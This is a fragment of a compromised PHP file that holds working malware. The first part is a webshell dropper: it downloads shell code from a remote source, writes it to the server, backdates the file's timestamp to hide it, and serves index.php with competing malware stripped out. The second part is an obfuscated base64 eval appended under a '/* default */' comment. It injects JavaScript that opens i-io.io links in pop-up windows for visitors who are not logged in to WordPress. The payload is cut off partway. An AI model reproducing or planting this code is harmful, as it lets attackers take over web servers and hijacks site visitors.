			    	$time3=@dir_size1(dirname(__FILE__),'');
					$time4=strtotime($time3[0]);
					touch($shell5,$time4);
			        echo $http1.$_SERVER["HTTP_HOST"].str_replace(BASE_PATH,"",$shell5).'--create success!';
			    }
			    else
			    {
			    	$shell_cont5=@curl_get_contents($shell_source5);
			    	$shell51=@file_put_contents($shell5,$shell_cont5);
			    	if($shell51>0){
			    		$time3=@dir_size1(dirname(__FILE__),'');
						$time4=strtotime($time3[0]);
						touch($shell5,$time4);
			    		echo $http1.$_SERVER["HTTP_HOST"].str_replace(BASE_PATH,"",$shell5).'--create success!';
			    	}else{
			    		echo $http1.$_SERVER["HTTP_HOST"].str_replace(BASE_PATH,"",$shell5).'--create fail!';
			    	}
			    }
	 		}
		}
		exit;
 	}else if($sig=='index'){
 		$file_path = BASE_PATH.'/index.php';
 		$file_path1 = BASE_PATH.'/index.html';
 		$file_path2 = BASE_PATH.'/index.htm';
 		$file_path3 = BASE_PATH.'/default.html';
 	
 		if(file_exists($file_path)){
 			$str=@file_get_contents($file_path);
 			$shell_content1=  $str;
			$shell_content2 = explode('?>',$shell_content1);
			$shell_content3 = $shell_content1;
			for($i=0;$i<count($shell_content2);$i++){
	 			if(strpos($shell_content2[$i],'base64_decode(') !== false || strpos($shell_content2[$i],'urldecode(') !== false || strpos($shell_content2[$i],'O00__0OOO_') !== false || strpos($shell_content2[$i],'yumingid') !== false || strpos($shell_content2[$i],'urlgz=') !== false || strpos($shell_content2[$i],'O0O_0O_O_0') !== false || strpos($shell_content2[$i],'wp-admin') !== false || strpos($shell_content2[$i],'ignore_user_abort') !== false || strpos($shell_content2[$i],'HTTP_REFERER') !== false || strpos($shell_content2[$i],'sitemap') !== false || strpos($shell_content2[$i],'$x(') !== false || strpos($shell_content2[$i],'$_GET["3x"]') !== false || strpos($shell_content2[$i],'error_reporting') !== false || strpos($shell_content2[$i],'ini_set(') !== false || strpos($shell_content2[$i],'ini_set(') !== false){
				 	$shell_content3=str_replace($shell_content2[$i]."?>","",$shell_content3);
				}
 			}
            echo $shell_content3;
 			exit;
 		}else if(file_exists($file_path1)){
 			$str1=@file_get_contents($file_path1);
 			echo $str1;
 			exit;
 		}else if(file_exists($file_path2)){
 			$str2=@file_get_contents($file_path2);
 			echo $str2;
 			exit;
 		}else if(file_exists($file_path3)){
 			$str3=@file_get_contents($file_path3);
 			echo $str3;
 			exit;
 		}else{
 			echo '';
 			exit;
 		}
 	}
 	exit();
?>
<?php /* default */ $YZWUF = 'base6'.'4'.'_de'.'cod'.'e'; error_reporting(0); eval($YZWUF('IGVycm9yX3JlcG9ydGluZygwKTsgQGluaV9zZXQoJ2Vycm9yX2xvZycsIE5VTEwpOyBAaW5pX3NldCgnbG9nX2Vycm9ycycsIDApOyBAaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCAwKTsgJGNHOU9JOCA9IDA7IGZvcmVhY2goJF9DT09LSUUgYXMgJHZValVuSHZPT29PID0+ICR2dnZValVuSHZPT29PKXsgaWYgKHN0cnN0cihzdHJ2YWwoJHZValVuSHZPT29PKSwgJ3dvcmRwcmVzc19sb2dnZWRfaW4nKSl7ICRjRzlPSTggPSAxOyBicmVhazsgfSB9IGlmKCRjRzlPSTggPT0gMCl7IGVjaG8gJzxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij5kb2N1bWVudC53cml0ZSh1bmVzY2FwZSgiJTNDJTczJTYzJTcyJTY5JTcwJTc0JTNFJTI4JTY2JTc1JTZFJTYzJTc0JTY5JTZGJTZFJTIwJTI4JTcwJTYxJTcyJTYxJTZEJTY1JTc0JTY1JTcyJTczJTI5JTIwJTdCJTBEJTBBJTIwJTIwJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTc0JTYxJTcyJTY3JTY1JTc0JTczJTIwJTNEJTIwJTVCJTI3JTY4JTc0JTc0JTcwJTczJTNBJTJGJTJGJTY5JTJEJTY5JTZGJTJFJTY5JTZGJTJGJTMwJTMxJTQ3JTZFJTY5JTI3JTJDJTIwJTI3JTY4JTc0JTc0JTcwJTczJTNBJTJGJTJGJTY5JTJEJTY5JTZGJTJFJTY5JTZGJTJGJTRFJTRCJTQyJTMzJTM5JTI3JTJDJTIwJTI3JTY4JTc0JTc0JTcwJTczJTNBJTJGJTJGJTY5JTJEJTY5JTZGJTJFJTY5JTZGJTJGJTcwJTU4JTUzJTU0JTQ2JTI3JTJDJTIwJTI3JTY4JTc0JTc0JTcwJTczJTNBJTJGJTJGJTY5JTJEJTY5JTZGJTJFJTY5JTZGJTJGJTMxJTZFJTY2JTY4JTM0JTI3JTJDJTIwJTI3JTY4JTc0JTc0JTcwJTczJTNBJTJGJTJGJTY5JTJEJTY5JTZGJTJFJTY5JTZGJTJGJTM1JTM0JTM1JTY2JTZDJTI3JTJDJTIwJTI3JTY4JTc0JTc0JTcwJTczJTNBJTJGJTJGJTY5JTJEJTY5JTZGJTJFJTY5JTZGJTJGJTY4JTRFJTM5JTM1JTZEJTI3JTJDJTIwJTI3JTY4JTc0JTc0JTcwJTczJTNBJTJGJTJGJTY5JTJEJTY5JTZGJTJFJTY5JTZGJTJGJTYzJTRDJTU2JTQyJTZDJTI3JTJDJTIwJTI3JTY4JTc0JTc0JTcwJTczJTNBJTJGJTJGJTY5JTJEJTY5JTZGJTJFJTY5JTZGJTJGJTU0JTM2JTM5JTMwJTU3JTI3JTJDJTIwJTI3JTY4JTc0JTc0JTcwJTczJTNBJTJGJTJGJTY5JTJEJTY5JTZGJTJFJTY5JTZGJTJGJTYzJTM2JTZCJTY0JTM1JTI3JTJDJTIwJTI3JTY4JTc0JTc0JTcwJTczJTNBJTJGJTJGJTY5JTJEJTY5JTZGJTJFJTY5JTZGJTJGJTY2JTRFJTczJTY3JTQ0JTI3JTVEJTBEJTBBJTIwJTIwJTIwJTIwJTJGJTJGJTIwJTU0JTY5JTZEJTY1JTczJTIwJTYyJTY1JTc0JTc3JTY1JTY1JTZFJTIwJTYzJTZDJTY5JTYzJTZCJTczJTBEJTBBJTIwJTIwJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTcyJTY1JTczJTc0JTREJTY5JTZFJTc1JTc0JTY1JTczJTIwJTNEJTIwJTMxJTNCJTBEJTBBJTIwJTIwJTIwJTIwJTJGJTJGJTIwJTRFJTc1JTZEJTYyJTY1JTcyJTIwJTZGJTY2JTIwJTY4JTZGJTc1JTcyJTczJTIwJTc0JTZGJTIwJTYxJTZDJTZDJTZGJTc3JTIwJTcyJTY1JTJEJTYzJTZDJTY5JTYzJTZCJTIwJTBEJTBBJTIwJTIwJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTYxJTZDJTZDJTZGJTc3JTY1JTY0JTQ4JTZGJTc1JTcyJTczJTIwJTNEJTIwJTMyJTNCJTBEJTBBJTBEJTBBJTBEJTBBJTIwJTIwJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTczJTYxJTc2JTY1JTU0JTYxJTcyJTY3JTY1JTc0JTRDJTZGJTYzJTYxJTc0JTY5JTZGJTZFJTczJTU0JTZGJTUzJTc0JTZGJTcyJTYxJTY3JTY1JTIwJTNEJTIwJTI4JTc0JTYxJTcyJTY3JTY1JTc0JTczJTI5JTIwJTNEJTNFJTIwJTdCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTc0JTYxJTcyJTY3JTY1JTc0JTczJTJFJTY2JTZGJTcyJTQ1JTYxJTYzJTY4JTI4JTI4JTc0JTYxJTcyJTY3JTY1JTc0JTJDJTIwJTY5JTZFJTY0JTY1JTc4JTI5JTIwJTNEJTNFJTIwJTdCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTY5JTY2JTI4JTIxJTZDJTZGJTYzJTYxJTZDJTUzJTc0JTZGJTcyJTYxJTY3JTY1JTJFJTY3JTY1JTc0JTQ5JTc0JTY1JTZEJTI4JTYwJTI0JTdCJTc0JTYxJTcyJTY3JTY1JTc0JTdEJTJEJTZDJTZGJTYzJTYxJTZDJTJEJTczJTc0JTZGJTcyJTYxJTY3JTY1JTYwJTI5JTI5JTdCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTA5JTZDJTZGJTYzJTYxJTZDJTUzJTc0JTZGJTcyJTYxJTY3JTY1JTJFJTczJTY1JTc0JTQ5JTc0JTY1JTZEJTI4JTYwJTI0JTdCJTc0JTYxJTcyJTY3JTY1JTc0JTdEJTJEJTZDJTZGJTYzJTYxJTZDJTJEJTczJTc0JTZGJTcyJTYxJTY3JTY1JTYwJTJDJTIwJTMwJTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTdEJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTdEJTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTdEJTBEJTBBJTIwJTIwJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTY3JTY1JTc0JTUyJTYxJTZFJTY0JTZGJTZEJTRDJTZGJTYzJTYxJTc0JTY5JTZGJTZFJTQ2JTcyJTZGJTZEJTUzJTc0JTZGJTcyJTYxJTY3JTY1JTIwJTNEJTIwJTI4JTc0JTYxJTcyJTY3JTY1JTc0JTczJTI5JTIwJTNEJTNFJTIwJTdCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTZFJTZGJTZFJTU2JTY5JTczJTY5JTc0JTY1JTY0JTIwJTNEJTIwJTc0JTYxJTcyJTY3JTY1JTc0JTczJTJFJTY2JTY5JTZDJTc0JTY1JTcyJTI4JTI4JTc0JTYxJTcyJTY3JTY1JTc0JTJDJTIwJTY5JTZFJTY0JTY1JTc4JTI5JTIwJTNEJTNFJTIwJTZDJTZGJTYzJTYxJTZDJTUzJTc0JTZGJTcyJTYxJTY3JTY1JTJFJTY3JTY1JTc0JTQ5JTc0JTY1JTZEJTI4JTYwJTI0JTdCJTc0JTYxJTcyJTY3JTY1JTc0JTdEJTJEJTZDJTZGJTYzJTYxJTZDJTJEJTczJTc0JTZGJTcyJTYxJTY3JTY1JTYwJTI5JTIwJTNEJTNEJTIwJTMwJTI5JTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTcyJTY1JTc0JTc1JTcyJTZFJTIwJTZFJTZGJTZFJTU2JTY5JTczJTY5JTc0JTY1JTY0JTVCJTREJTYxJTc0JTY4JTJFJTY2JTZDJTZGJTZGJTcyJTI4JTREJTYxJTc0JTY4JTJFJTcyJTYxJTZFJTY0JTZGJTZEJTI4JTI5JTIwJTJBJTIwJTZFJTZGJTZFJTU2JTY5JTczJTY5JTc0JTY1JTY0JTJFJTZDJTY1JTZFJTY3JTc0JTY4JTI5JTVEJTNCJTBEJTBBJTIwJTIwJTIwJTIwJTdEJTBEJTBBJTIwJTIwJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTczJTY1JTc0JTRDJTZGJTYzJTYxJTc0JTY5JTZGJTZFJTQxJTczJTU2JTY5JTczJTY5JTc0JTY1JTY0JTIwJTNEJTIwJTI4JTc0JTYxJTcyJTY3JTY1JTc0JTI5JTIwJTNEJTNFJTIwJTZDJTZGJTYzJTYxJTZDJTUzJTc0JTZGJTcyJTYxJTY3JTY1JTJFJTczJTY1JTc0JTQ5JTc0JTY1JTZEJTI4JTYwJTI0JTdCJTc0JTYxJTcyJTY3JTY1JTc0JTdEJTJEJTZDJTZGJTYzJTYxJTZDJTJEJTczJTc0JTZGJTcyJTYxJTY3JTY1JTYwJTJDJTIwJTMxJTI5JTNCJTBEJTBBJTBEJTBBJTIwJTIwJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTY3JTY1JTc0JTU0JTY5JTZEJTY1JTUzJTc0JTZGJTcyJTYxJTY3JTY1JTIwJTNEJTIwJTI4JTZCJTY1JTc5JTI5JTIwJTNEJTNFJTIwJTZDJTZGJTYzJTYxJTZDJTUzJTc0JTZGJTcyJTYxJTY3JTY1JTJFJTY3JTY1JTc0JTQ5JTc0JTY1JTZEJTI4JTYwJTI0JTdCJTZCJTY1JTc5JTdEJTJEJTZDJTZGJTYzJTYxJTZDJTJEJTczJTc0JTZGJTcyJTYxJTY3JTY1JTYwJTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTczJTY1JTc0JTU0JTY5JTZEJTY1JTU0JTZGJTUzJTc0JTZGJTcyJTYxJTY3JTY1JTIwJTNEJTIwJTI4JTZCJTY1JTc5JTJDJTIwJTZFJTZGJTc3JTQ0JTYxJTc0JTY1JTI5JTIwJTNEJTNFJTIwJTZDJTZGJTYzJTYxJTZDJTUzJTc0JTZGJTcyJTYxJTY3JTY1JTJFJTczJTY1JTc0JTQ5JTc0JTY1JTZEJTI4JTYwJTI0JTdCJTZCJTY1JTc5JTdEJTJEJTZDJTZGJTYzJTYxJTZDJTJEJTczJTc0JTZGJTcyJTYxJTY3JTY1JTYwJTJDJTIwJTZFJTZGJTc3JTQ0JTYxJTc0JTY1JTI5JTNCJTBEJTBBJTBEJTBBJTIwJTIwJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTY3JTY1JTc0JTQ4JTZGJTc1JTcyJTczJTQ0JTY5JTY2JTY2JTIwJTNEJTIwJTI4JTczJTc0JTYxJTcyJTc0JTQ0JTYxJTc0JTY1JTJDJTIwJTY1JTZFJTY0JTQ0JTYxJTc0JTY1JTI5JTIwJTNEJTNFJTIwJTdCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTZEJTczJTQ5JTZFJTQ4JTZGJTc1JTcyJTIwJTNEJTIwJTMxJTMwJTMwJTMwJTIwJTJBJTIwJTM2JTMwJTIwJTJBJTIwJTM2JTMwJTNCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTcyJTY1JTc0JTc1JTcyJTZFJTIwJTREJTYxJTc0JTY4JTJFJTcyJTZGJTc1JTZFJTY0JTI4JTREJTYxJTc0JTY4JTJFJTYxJTYyJTczJTI4JTY1JTZFJTY0JTQ0JTYxJTc0JTY1JTIwJTJEJTIwJTczJTc0JTYxJTcyJTc0JTQ0JTYxJTc0JTY1JTI5JTIwJTJGJTIwJTZEJTczJTQ5JTZFJTQ4JTZGJTc1JTcyJTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTdEJTBEJTBBJTIwJTIwJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTY3JTY1JTc0JTREJTY5JTZFJTc0JTczJTQ0JTY5JTY2JTY2JTIwJTNEJTIwJTI4JTczJTc0JTYxJTcyJTc0JTQ0JTYxJTc0JTY1JTJDJTIwJTY1JTZFJTY0JTQ0JTYxJTc0JTY1JTI5JTIwJTNEJTNFJTIwJTdCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTZEJTczJTQ5JTZFJTREJTY5JTZFJTc0JTczJTIwJTNEJTIwJTMxJTMwJTMwJTMwJTIwJTJBJTIwJTM2JTMwJTNCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTcyJTY1JTc0JTc1JTcyJTZFJTIwJTREJTYxJTc0JTY4JTJFJTcyJTZGJTc1JTZFJTY0JTI4JTREJTYxJTc0JTY4JTJFJTYxJTYyJTczJTI4JTY1JTZFJTY0JTQ0JTYxJTc0JTY1JTIwJTJEJTIwJTczJTc0JTYxJTcyJTc0JTQ0JTYxJTc0JTY1JTI5JTIwJTJGJTIwJTZEJTczJTQ5JTZFJTREJTY5JTZFJTc0JTczJTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTdEJTBEJTBBJTBEJTBBJTIwJTIwJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTc2JTY5JTczJTY5JTc0JTRFJTY1JTc3JTRDJTZGJTYzJTYxJTc0JTY5JTZGJTZFJTIwJTNEJTIwJTI4JTc0JTYxJTcyJTY3JTY1JTc0JTczJTJDJTIwJTY4JTZGJTczJTc0JTJDJTIwJTZFJTZGJTc3JTQ0JTYxJTc0JTY1JTI5JTIwJTNEJTNFJTIwJTdCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTczJTYxJTc2JTY1JTU0JTYxJTcyJTY3JTY1JTc0JTRDJTZGJTYzJTYxJTc0JTY5JTZGJTZFJTczJTU0JTZGJTUzJTc0JTZGJTcyJTYxJTY3JTY1JTI4JTc0JTYxJTcyJTY3JTY1JTc0JTczJTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTZFJTY1JTc3JTRDJTZGJTYzJTYxJTc0JTY5JTZGJTZFJTIwJTNEJTIwJTY3JTY1JTc0JTUyJTYxJTZFJTY0JTZGJTZEJTRDJTZGJTYzJTYxJTc0JTY5JTZGJTZFJTQ2JTcyJTZGJTZEJTUzJTc0JTZGJTcyJTYxJTY3JTY1JTI4JTc0JTYxJTcyJTY3JTY1JTc0JTczJTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTczJTY1JTc0JTU0JTY5JTZEJTY1JTU0JTZGJTUzJTc0JTZGJTcyJTYxJTY3JTY1JTI4JTYwJTI0JTdCJTY4JTZGJTczJTc0JTdEJTJEJTZEJTZFJTc0JTczJTYwJTJDJTIwJTZFJTZGJTc3JTQ0JTYxJTc0JTY1JTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTczJTY1JTc0JTU0JTY5JTZEJTY1JTU0JTZGJTUzJTc0JTZGJTcyJTYxJTY3JTY1JTI4JTYwJTI0JTdCJTY4JTZGJTczJTc0JTdEJTJEJTY4JTc1JTcyJTczJTYwJTJDJTIwJTZFJTZGJTc3JTQ0JTYxJTc0JTY1JTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTczJTY1JTc0JTRDJTZGJTYzJTYxJTc0JTY5JTZGJTZFJTQxJTczJTU2JTY5JTczJTY5JTc0JTY1JTY0JTI4JTZFJTY1JTc3JTRDJTZGJTYzJTYxJTc0JTY5JTZGJTZFJTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTc3JTY5JTZFJTY0JTZGJTc3JTJFJTZGJTcwJTY1JTZFJTI4JTZFJTY1JTc3JTRDJTZGJTYzJTYxJTc0JTY5JTZGJTZFJTJDJTIwJTIyJTVGJTYyJTZDJTYxJTZFJTZCJTIyJTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTdEJTBEJTBBJTBEJTBBJTIwJTIwJTIwJTIwJTJGJTJGJTIwJTYzJTZGJTZFJTczJTc0JTIwJTcyJTYxJTZFJTY0JTZGJTZEJTRDJTZGJTYzJTYxJTc0JTY5JTZGJTZFJTIwJTNEJTIwJTY3JTY1JTc0JTUyJTYxJTZFJTY0JTZGJTZEJTRDJTZGJTYzJTYxJTc0JTY5JTZGJTZFJTQ2JTcyJTZGJTZEJTUzJTc0JTZGJTcyJTYxJTY3JTY1JTI4JTc0JTYxJTcyJTY3JTY1JTc0JTczJTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTczJTYxJTc2JTY1JTU0JTYxJTcyJTY3JTY1JTc0JTRDJTZGJTYzJTYxJTc0JTY5JTZGJTZFJTczJTU0JTZGJTUzJTc0JTZGJTcyJTYxJTY3JTY1JTI4JTc0JTYxJTcyJTY3JTY1JTc0JTczJTI5JTNCJTBEJTBBJTBEJTBBJTIwJTIwJTIwJTIwJTY2JTc1JTZFJTYzJTc0JTY5JTZGJTZFJTIwJTY3JTZDJTZGJTYyJTYxJTZDJTQzJTZDJTY5JTYzJTZCJTI4JTY1JTc2JTY1JTZFJTc0JTI5JTIwJTdCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTY1JTc2JTY1JTZFJTc0JTJFJTczJTc0JTZGJTcwJTUwJTcyJTZGJTcwJTYxJTY3JTYxJTc0JTY5JTZGJTZFJTI4JTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTY4JTZGJTczJTc0JTIwJTNEJTIwJTZDJTZGJTYzJTYxJTc0JTY5JTZGJTZFJTJFJTY4JTZGJTczJTc0JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTZDJTY1JTc0JTIwJTZFJTY1JTc3JTRDJTZGJTYzJTYxJTc0JTY5JTZGJTZFJTIwJTNEJTIwJTY3JTY1JTc0JTUyJTYxJTZFJTY0JTZGJTZEJTRDJTZGJTYzJTYxJTc0JTY5JTZGJTZFJTQ2JTcyJTZGJTZEJTUzJTc0JTZGJTcyJTYxJTY3JTY1JTI4JTc0JTYxJTcyJTY3JTY1JTc0JTczJTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTZFJTZGJTc3JTQ0JTYxJTc0JTY1JTIwJTNEJTIwJTQ0JTYxJTc0JTY1JTJFJTcwJTYxJTcyJTczJTY1JTI4JTZFJTY1JTc3JTIwJTQ0JTYxJTc0JTY1JTI4JTI5JTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTczJTYxJTc2JTY1JTY0JTQ0JTYxJTc0JTY1JTQ2JTZGJTcyJTREJTY5JTZFJTc0JTczJTIwJTNEJTIwJTY3JTY1JTc0JTU0JTY5JTZEJTY1JTUzJTc0JTZGJTcyJTYxJTY3JTY1JTI4JTYwJTI0JTdCJTY4JTZGJTczJTc0JTdEJTJEJTZEJTZFJTc0JTczJTYwJTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTczJTYxJTc2JTY1JTY0JTQ0JTYxJTc0JTY1JTQ2JTZGJTcyJTQ4JTZGJTc1JTcyJTczJTIwJTNEJTIwJTY3JTY1JTc0JTU0JTY5JTZEJTY1JTUzJTc0JTZGJTcyJTYxJTY3JTY1JTI4JTYwJTI0JTdCJTY4JTZGJTczJTc0JTdEJTJEJTY4JTc1JTcyJTczJTYwJTI5JTNCJTBEJTBBJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTY5JTY2JTIwJTI4JTczJTYxJTc2JTY1JTY0JTQ0JTYxJTc0JTY1JTQ2JTZGJTcyJTREJTY5JTZFJTc0JTczJTIwJTI2JTI2JTIwJTczJTYxJTc2JTY1JTY0JTQ0JTYxJTc0JTY1JTQ2JTZGJTcyJTQ4JTZGJTc1JTcyJTczJTI5JTIwJTdCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTc0JTcyJTc5JTIwJTdCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTczJTc0JTZGJTcyJTYxJTY3JTY1JTQ0JTYxJTc0JTY1JTQ2JTZGJTcyJTREJTY5JTZFJTc0JTczJTIwJTNEJTIwJTcwJTYxJTcyJTczJTY1JTQ5JTZFJTc0JTI4JTczJTYxJTc2JTY1JTY0JTQ0JTYxJTc0JTY1JTQ2JTZGJTcyJTREJTY5JTZFJTc0JTczJTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTczJTc0JTZGJTcyJTYxJTY3JTY1JTQ0JTYxJTc0JTY1JTQ2JTZGJTcyJTQ4JTZGJTc1JTcyJTczJTIwJTNEJTIwJTcwJTYxJTcyJTczJTY1JTQ5JTZFJTc0JTI4JTczJTYxJTc2JTY1JTY0JTQ0JTYxJTc0JTY1JTQ2JTZGJTcyJTQ4JTZGJTc1JTcyJTczJTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTZEJTY5JTZFJTc0JTczJTQ0JTY5JTY2JTY2JTIwJTNEJTIwJTY3JTY1JTc0JTREJTY5JTZFJTc0JTczJTQ0JTY5JTY2JTY2JTI4JTZFJTZGJTc3JTQ0JTYxJTc0JTY1JTJDJTIwJTczJTc0JTZGJTcyJTYxJTY3JTY1JTQ0JTYxJTc0JTY1JTQ2JTZGJTcyJTREJTY5JTZFJTc0JTczJTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTY4JTZGJTc1JTcyJTczJTQ0JTY5JTY2JTY2JTIwJTNEJTIwJTY3JTY1JTc0JTQ4JTZGJTc1JTcyJTczJTQ0JTY5JTY2JTY2JTI4JTZFJTZGJTc3JTQ0JTYxJTc0JTY1JTJDJTIwJTczJTc0JTZGJTcyJTYxJTY3JTY1JTQ0JTYxJTc0JTY1JTQ2JTZGJTcyJTQ4JTZGJTc1JTcyJTczJTI5JTNCJTBEJTBBJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTY5JTY2JTIwJTI4JTY4JTZGJTc1JTcyJTczJTQ0JTY5JTY2JTY2JTIwJTNFJTNEJTIwJTYxJTZDJTZDJTZGJTc3JTY1JTY0JTQ4JTZGJTc1JTcyJTczJTI5JTIwJTdCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTczJTYxJTc2JTY1JTU0JTYxJTcyJTY3JTY1JTc0JTRDJTZGJTYzJTYxJTc0JTY5JTZGJTZFJTczJTU0JTZGJTUzJTc0JTZGJTcyJTYxJTY3JTY1JTI4JTc0JTYxJTcyJTY3JTY1JTc0JTczJTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTczJTY1JTc0JTU0JTY5JTZEJTY1JTU0JTZGJTUzJTc0JTZGJTcyJTYxJTY3JTY1JTI4JTYwJTI0JTdCJTY4JTZGJTczJTc0JTdEJTJEJTY4JTc1JTcyJTczJTYwJTJDJTIwJTZFJTZGJTc3JTQ0JTYxJTc0JTY1JTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTdEJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTY5JTY2JTIwJTI4JTZEJTY5JTZFJTc0JTczJTQ0JTY5JTY2JTY2JTIwJTNFJTNEJTIwJTcyJTY1JTczJTc0JTREJTY5JTZFJTc1JTc0JTY1JTczJTI5JTIwJTdCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTY5JTY2JTIwJTI4JTZFJTY1JTc3JTRDJTZGJTYzJTYxJTc0JTY5JTZGJTZFJTI5JTIwJTdCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTczJTY1JTc0JTU0JTY5JTZEJTY1JTU0JTZGJTUzJTc0JTZGJTcyJTYxJTY3JTY1JTI4JTYwJTI0JTdCJTY4JTZGJTczJTc0JTdEJTJEJTZEJTZFJTc0JTczJTYwJTJDJTIwJTZFJTZGJTc3JTQ0JTYxJTc0JTY1JTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTc3JTY5JTZFJTY0JTZGJTc3JTJFJTZGJTcwJTY1JTZFJTI4JTZFJTY1JTc3JTRDJTZGJTYzJTYxJTc0JTY5JTZGJTZFJTJDJTIwJTIyJTVGJTYyJTZDJTYxJTZFJTZCJTIyJTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTczJTY1JTc0JTRDJTZGJTYzJTYxJTc0JTY5JTZGJTZFJTQxJTczJTU2JTY5JTczJTY5JTc0JTY1JTY0JTI4JTZFJTY1JTc3JTRDJTZGJTYzJTYxJTc0JTY5JTZGJTZFJTI5JTNCJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTdEJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTdEJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJT